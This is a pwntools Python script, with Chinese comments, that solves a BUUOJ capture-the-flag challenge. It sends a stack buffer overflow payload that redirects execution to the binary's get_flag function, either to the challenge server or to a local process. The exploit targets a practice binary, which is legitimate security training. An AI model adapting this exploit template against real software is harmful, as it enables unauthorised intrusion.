'''
@Author       : 白银
@Date         : 2023-04-01 15:45:04
@LastEditors  : 白银
@LastEditTime : 2023-04-01 16:40:52
@FilePath     : /pwn/get_started_3dsctf_2016.py
@Description  : https://buuoj.cn/challenges#get_started_3dsctf_2016
@Attention    : 
@Copyright (c) 2023 by 白银 captain-jparrow@qq.com, All Rights Reserved. 
'''

from pwn import *

set_arch = 2  # set_arch中，int，0→amd64，1→arm64，2→i386
pwnfile = './get_started_3dsctf_2016'  # pwnfile， str，二进制文件
if_remote = 1  # if_remote，int，1→远程，别的数字→本地
# 打本地，if_remote改别的数字就可以，最后两个参数随便改


# set_arch = 0
if set_arch == 0:
    context(log_level='debug', arch='amd64', os='linux')
elif set_arch == 1:
    context(log_level='debug', arch='arm64', os='linux')
elif set_arch == 2:
    context(log_level='debug', arch='i386', os='linux')

print(context)
# context(log_level='debug', arch='i386', os='linux')
# pwnfile = './pwn1'
elf = ELF(pwnfile)

if if_remote == 1:
    # io = remote("192.168.61.139", 8888)
    # io = remote(remote_addr, remote_port)
    io = remote("node4.buuoj.cn", 26313)
    # libc = ELF('/home/jack/Desktop/libc.so.6')
    if set_arch == 0 or set_arch == 1:
        libc = ELF('/home/jack/Desktop/2.23x64libc.so.6')
    else:
        libc = ELF('/home/jack/Desktop/2.23x86libc.so.6')
else:
    io = process(pwnfile)
    # 本地用
    # elf = ELF(pwnfile)
    libc = elf.libc
    rop = ROP(pwnfile)
    # 本地调试用
    gdb.attach(io)
    pause()

padding = 0x38  # ida看，上限和r差多少
return_addr = 0x80489a0  # 程序里面有get_flag的函数，直接找地址
exit_addr = 0x804e6a0
a1 = 0x308CD64F
a2 = 0x195719D1

# payload = b'a' * padding + p32(0x080489A0) + p32(0x0804E6A0) + p32(a1) + p32(a2)
# payload = b'a' * padding + p32(return_addr) + p32(exit_addr) + p32(a1) + p32(a2)
payload = flat(['a' * padding, return_addr, exit_addr, a1, a2])
print(payload)
# print(payload2)
# delimiter = 'Qual a palavrinha magica? '

if if_remote == 1:
    io.sendline(payload)
    # io.sendlineafter(delimiter, payload)  # 远程用

else:
    io.sendline(payload)
    # io.sendlineafter(delimiter, payload)  # 本地用

io.interactive()
